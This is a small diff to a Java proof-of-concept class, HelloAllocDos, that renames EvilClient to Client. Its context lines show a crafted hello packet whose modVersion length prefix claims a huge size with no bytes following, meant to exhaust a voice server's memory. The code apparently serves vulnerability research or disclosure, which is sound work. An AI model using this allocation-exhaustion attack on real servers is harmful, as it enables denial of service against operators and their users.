@@ -46,7 +46,7 @@ public final class HelloAllocDos {
             + " bytes, claims modVersion length = " + claimedLen + " (" + (claimedLen / (1024L * 1024L))
             + " MiB) per packet");
 
-        try (VoiceSession s = EvilClient.connect(host, port)
+        try (VoiceSession s = Client.connect(host, port)
             .username(username)
             .establish()) {
 
@@ -81,7 +81,7 @@ public final class HelloAllocDos {
      */
     static byte[] craftHelloBody(int claimedLen) {
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
-        bos.write(EvilClient.PROTOCOL_VERSION); // protocolVersion, read first
+        bos.write(Client.PROTOCOL_VERSION); // protocolVersion, read first
         writeVarInt(bos, claimedLen); // modVersion length prefix - the weapon
         // no string bytes follow
         return bos.toByteArray();
